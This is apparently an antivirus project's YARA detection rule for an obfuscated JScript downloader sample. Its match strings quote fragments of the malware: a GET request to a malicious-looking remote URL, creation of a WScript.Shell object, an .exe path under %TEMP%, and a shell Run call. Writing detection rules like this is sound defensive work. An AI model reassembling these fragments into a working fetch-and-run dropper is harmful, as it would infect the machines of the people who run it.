rule sig_20160401_8aacd1bf39f9f5685eeecb31e066a1ca {
  meta:
    description = "datamaliciousorder - file 20160401_8aacd1bf39f9f5685eeecb31e066a1ca.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a863d82424cdf75a0a15435ef9d8f01dbf4185ab59ef75184531f35e59e8672f"

  strings:
    $s1  = "WlkNht[GcFz](\"G\" + \"ET\", \"http://abnregistrationaustralia.com.au/k38sa\", false);" fullword ascii
    $s2  = "function IjZl(HyAz, ZwgPbj){NkCea = NkCea * 1; return HyAz - ZwgPbj;};" fullword ascii
    $s3  = "var AnzCf = function KcZrr() {return WScript[LfAp](\"WScript\"+\".Shell\");}(), PyvDuk = 11;" fullword ascii
    $s4  = "if (WlkNht[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function LeYim() {return AnzCf[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"J42eNacvdB4DevoW.ex\" + \"e\";};" fullword ascii
    $s6  = "function AsKv(){return AdNya + \"\";};" fullword ascii
    $s7  = "function YuAuz() {return ((WfgMw == true) && (WfgMw == GzZqz)) ? 1 : NkCea;};" fullword ascii
    $s8  = "}while (ZzbBp);" fullword ascii
    $s9  = "var QlBk = new this[\"Date\"]();" fullword ascii
    $s10 = "function OlUff(){return LfAp;};" fullword ascii
    $s11 = "GzZqz = true; " fullword ascii
    $s12 = "WfgMw = true; " fullword ascii
    $s13 = "function HzBmq(HvrFk) {var DkAs = (1, 2, 3, 4, 5, HvrFk); return DkAs;};" fullword ascii
    $s14 = "function UwGha(DdfUwg){AnzCf[\"R\"+\"un\"](DdfUwg, NkCea, NkCea);};" fullword ascii
    $s15 = "function GamQgk(){return 23;};" fullword ascii
    $s16 = "function InfVq()" fullword ascii
    $s17 = "return IjZl(HjyDbr, LmeRvx);" fullword ascii
    $s18 = "var GzZqz = false;" fullword ascii
    $s19 = "var WfgMw = false;" fullword ascii
    $s20 = "var SjSud = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}